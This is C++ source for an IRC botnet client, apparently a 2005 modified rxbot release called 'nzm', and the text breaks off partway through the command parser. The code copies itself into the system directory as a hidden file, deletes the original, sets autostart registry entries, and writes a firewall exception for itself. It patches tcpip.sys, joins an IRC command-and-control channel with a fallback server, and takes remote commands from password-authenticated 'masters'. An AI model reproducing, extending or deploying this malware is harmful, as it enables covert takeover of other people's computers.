/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../config/cfg.h"
#include "../../headers/globals.h"
#include "../../headers/externs.h"
#include "../../headers/md5.h"

extern "C" {
	#include "../../headers/version.h"
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;

	#ifndef NO_EHANDLER
	// install exception handler
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           // Build EXCEPTION_REGISTRATION record:
        push    handler         // Address of handler function
        push    FS:[0]          // Address of previous handler
        mov     FS:[0],ESP      // Install new EXECEPTION_REGISTRATION
    }

	#endif

	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());

	#ifdef DEBUG_LOGGING
	opendebuglog();
	#endif

	LoadDLLs(); // load all the dlls and functions here

	// hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	//prepare directory
	GetSystemDirectory(sysdir, sizeof(sysdir));

	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif

		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifdef DEBUG_CONSOLE
	OpenConsole();
	printf("Debugging console enabled.\n\n");
	#endif

	#ifndef NO_MELT
	// now delete it
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000); //wait for 2 sec to make sure process has fully exited
			DeleteFile(__argv[2]);
		}
	}
	#endif

	char tmpfilename[MAX_PATH];
	sprintf(tmpfilename, "%s\\%s", sysdir, filename);
	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs(tmpfilename);

	if (BypassFW) {
		char pfad[256];
		_snprintf(pfad, sizeof(pfad),"%s:*:Enabled:%s", tmpfilename, valuename);
		HKEY hkey;

		fRegCreateKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
		fRegSetValueEx(hkey, tmpfilename, 0, REG_SZ, (const unsigned char *)pfad, strlen(pfad));
		fRegCloseKey(hkey);
	}

	sprintf(logbuf,"nzm (irc.plg) »»  Bot started.");
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	// remove the following line if you don't want any predefined aliases
	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();

    #ifndef NO_REGISTRY
	sprintf(logbuf,"nzm (secure.plg) »»  Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"nzm (secure.plg) »»  Failed to start registry thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

	// set version while bot is running
	current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist)); // fixed

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2)
				break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(10000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	killthreadall();
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

    DWORD id=0;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0)
			return 0;

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(sock, nickbuf, nicktype);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
		#endif
		addlogv("nzm (irc.plg) »»  Connected to %s.", irc.host);

		if (PatchTCPIP && checkos()) {
			char szPath[MAX_PATH], szSysDir[MAX_PATH];	
			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szPath, "%s\\drivers\\tcpip.sys", szSysDir);
			int version = tcpipVersion(szPath);
			if (version != 0) {
				PATCHER patcher;
				patcher.sock = sock;
				patcher.notice = FALSE;
				strncpy(patcher.path, szPath, sizeof(patcher.path));
				patcher.version = version;

				patcher.threadnum = addthread(".n.z.m. (patcher.p.l.g) .»».  TCPIP.SYSPatcher.", PATCHER_THREAD, NULL);
				if (threads[patcher.threadnum].tHandle = CreateThread(NULL, 0, &PatcherThread, (LPVOID)&patcher, 0, &id)) 
					while (patcher.gotinfo == FALSE)
						Sleep(50);
			}
		}

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0)
			continue;
		else if (rval == 1) {	//Disconnect (sleep 15 mins, reconnect..)
			Sleep(900000);
			continue;
		}
		else if (rval == 2)
			break;	//Quit
	}
	clearthread(irc.threadnum);

	return rval;
}

// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	// main receive buffer
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(hsock, str, LETTERNICK, FALSE), nick1);

	#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		memset(buffer, 0, sizeof(buffer));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0)
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
				#endif

				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;

	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++)
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL)
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i])
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else
			break;
	}

	if (parameters['s'])
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		//irc_sendv(sock, "PONG %s\r\n", a[1]+1);
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		//if (*in_channel == 0)
			irc_sendv(sock, "COIN %s %s\r\n", channel, chanpass);

		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); // get our hostname
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		irc_sendv(sock, "COIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL)
			strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use
	if (strcmp("433", a[1]) == 0) {
		//strcpy(nick1, host);
		rndnick(sock, nick1, nicktype);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL)
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"nzm (irc.plg) »»  User %s logged out.", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "COIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126)
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "nzm (irc.plg) »»  User: %s logged out.", user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0)
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0)
			*in_channel = 1;
		addlogv("nzm (irc.plg) »»  Joined channel: %s.", a[4]);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0)
				notice = TRUE;
			if (a[2] == NULL) return 1;

			if (strstr(a[2], "#") == NULL || notice)
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0)
					s = 4;
				else
					s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			// new version code that doesn't crash bot
			if (strcmp("\1VERSION\1", a[s]) == 0)
							if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
								irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);

								sprintf(sendbuf, "%s has just versioned me.", user);//->
								addlog(sendbuf);

								if (!ismaster)
									irc_privmsg(sock, mainirc.channel, sendbuf, true);

								return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0)
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix)
			return 1;

		// see if someone is logging in
		if (strcmp(slogin, a[s]) == 0) {
			if (a[s+1] == NULL || ismaster)
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Nice try, idiot. (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :You've been logged.\r\n", user);
				sprintf(sendbuf, "nzm (irc.plg) »»  *Failed pass auth by: (%s!%s).", u, h);
				addlog(sendbuf);
				return 1;
			}

			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof((char *)authost) / sizeof(LPTSTR));i++) {
			#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) {
					host_ok = TRUE;
					break;
				}
			#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
			#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Nice try, idiot. (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :You've been logged.\r\n", user);
 				sprintf(sendbuf, "nzm (irc.plg) »»  *Failed host auth by: (%s!%s).", u, h);
 				addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "nzm (irc.plg) »»  Password accepted.", notice);
					addlogv("nzm (irc.plg) »»  User: %s logged in.", user);
					break;
				}
			}
			return 1;
		}

		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL)
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(sock, ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0)
						ntmp2[0] = (char)atoi(ntmp);
					else
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++)
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL)
					return 1;
				a[s] += 3;
			}

			if (strcmp("irc.rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(sock, nick, nicktype, a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

				addlogv("nzm (irc.plg) »»  Random nick change: %s",nick);

				return repeat;
			}
			else if (strcmp("irc.die", a[s]) == 0 || strcmp("irc.di", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
					#ifdef DEBUG_LOGGING
					closedebuglog();
					#endif
					killthreadall();
					ExitProcess(EXIT_SUCCESS);
				}
			}
			else if (strcmp("irc.logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				if (a[s+1]) {
					char *os="", *sp="";

					OSVERSIONINFO verinfo;
					verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
					GetVersionEx(&verinfo); 

					if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1 && strstr(verinfo.szCSDVersion, "2") != NULL) {
						sprintf(sendbuf, ".n.z.m. (irc.p.l.g) .»».  User %s not logging out - SP2 box.", user);
					} else {
						for (i = 0; i < MAXLOGINS; i++)
							if (strcmp(masters[i], a[0]) == 0) {
								masters[i][0] = '\0';
								sprintf(sendbuf, ".n.z.m. (irc.p.l.g) .»».  User %s logged out.", user);
								break;
						}
					}

				} else {
					for (i = 0; i < MAXLOGINS; i++)
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "nzm (irc.plg) »»  User %s logged out.", user);
							break;
					}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_BOTVERSION
			else if (strcmp("irc.version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, "nzm (irc.plg) »»  %s", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp("log.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"log..","Log list",LOG_THREAD,a[s+1]);

				return 1;
			}
			#ifndef NO_TFTPD
			else if (strcmp("daemon.tftp.off", a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"tftpd..","Server",TFTP_THREAD,a[s+1]);

				return 1;
			}
			#endif

			#ifndef NO_PROCESS
			else if (strcmp("com.procs.off",a[s]) == 0 || strcmp("com.ps.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"proc..","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("lockdown.stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"secure..","Secure",SECURE_THREAD,a[s+1]);

				return 1;
			}
			#ifndef NO_ADVSCAN
			else if (strcmp("scanstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[SCAN]","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("stats",a[s]) == 0 || strcmp("st",a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			else if (strcmp("irc.reconnect", a[s]) == 0 || strcmp("irc.r", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("nzm (irc.plg) »»  Reconnecting.");

				return 0;
			}
			else if (strcmp("irc.disconnect", a[s]) == 0 || strcmp("irc.d", a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				addlog("nzm (irc.plg) »»  Disconnecting.");

				return -1;
			}
			else if (strcmp("irc.quit", a[s]) == 0 || strcmp("irc.q", a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else
					irc_sendv(sock, "QUIT :later\r\n");

				return -2;
			}
			else if (strcmp("irc.status", a[s]) == 0 || strcmp("irc.s", a[s]) == 0) {
				sprintf(sendbuf, "nzm (irc.plg) »»  Status: Ready. Bot Uptime: %s.", Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("irc.id", a[s]) == 0 || strcmp("irc.i", a[s]) == 0) {
				sprintf(sendbuf, "nzm (irc.plg) »»  Bot ID: %s.", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("com.rebewt", a[s]) == 0) {
				sprintf(sendbuf, ((Reboot())?("nzm (irc.plg) »»  Rebooting system."):("nzm (irc.plg) »»  Failed to reboot system.")));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("com.restart", a[s]) == 0 || strcmp("com.r", a[s]) == 0) {

				char dest[MAX_PATH];
				GetModuleFileName(0,dest,sizeof(dest));

				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&pinfo, 0, sizeof(pinfo));
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.lpTitle = "";
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow = SW_HIDE;

				if (CreateProcess(NULL, dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
					sprintf(sendbuf,"Clone running... now restarting...");
					fWSACleanup();
					ExitProcess(EXIT_SUCCESS);
				} else
					sprintf(sendbuf,"Restart failed. Couldn't open file: %s", dest);

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("threads.list", a[s]) == 0 || strcmp("threads.l", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "nzm (threads.plg) »»  List threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"nzm (threads.plg) »»  Failed to start list thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("irc.aliases", a[s]) == 0 || strcmp("irc.al", a[s]) == 0) {
				aliaslist(sock, a[2], notice);
				addlog("nzm (irc.plg) »»  Alias list.");

				return repeat;
			}
			else if (strcmp("irc.log", a[s]) == 0 || strcmp("irc.lg", a[s]) == 0) {
				SHOWLOG showlog;
